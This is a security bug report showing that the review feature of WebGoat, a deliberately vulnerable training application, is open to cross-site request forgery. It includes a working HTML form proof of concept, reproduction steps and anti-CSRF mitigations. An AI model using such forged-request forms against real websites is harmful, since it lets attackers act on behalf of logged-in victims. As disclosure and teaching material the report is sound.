# WebGoat. Review page functionality is vulnerable for CSRF
Review functionality on the page "/WebGoat/start.mvc#lesson/CSRF.lesson/3" is vulnerable for CSRF. 
It is possible to post an arbitrary review comment on behalf of a logged-in user by tricking the user to do some simple actions and forging their request to the review component. 

## Requirements Violation
The following requirements are violated: 
- [Application Security Requirements v. 4.0] [Req. 8.3.1] A unique token should be added to any request that causes modification of data.
- Best Security Practices.

## Business Impact
Unauthorised access to the system.

## Steps to Reproduce
1. Craft an HTML page including the following form:
```html
    <form accept-charset="UNKNOWN" id="csrf-review" method="POST" successcallback="" action="http://www.webgoat.local:8080/WebGoat/csrf/review">
        <input id="reviewText" name="reviewText" type="text" value="The worst app I've ever seen!">
        <input id="reviewStars" name="stars" type="text" value="1">
        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
        <input type="submit" name="submit" value="Do me a favour">
    </form>
```
2. Login to WebGoat application in a web browser.
3. Open the page created on step 1 in the browser you are logged-in. 
4. Push the "Do me a favour" button. 
5. Open [review page](http://www.webgoat.local:8080/WebGoat/start.mvc#lesson/CSRF.lesson/3)
6. Find the review comment "The worst app I've ever seen!" posted from your account.

## Mitigation Recommendations
1. Implement Anti-CSRF tokens for the requests which cause modification of data. Use implementation from the web framework.  
2. See [cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).

## Additional Information
**Version**: 8.2.2  
**CVSS**: https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N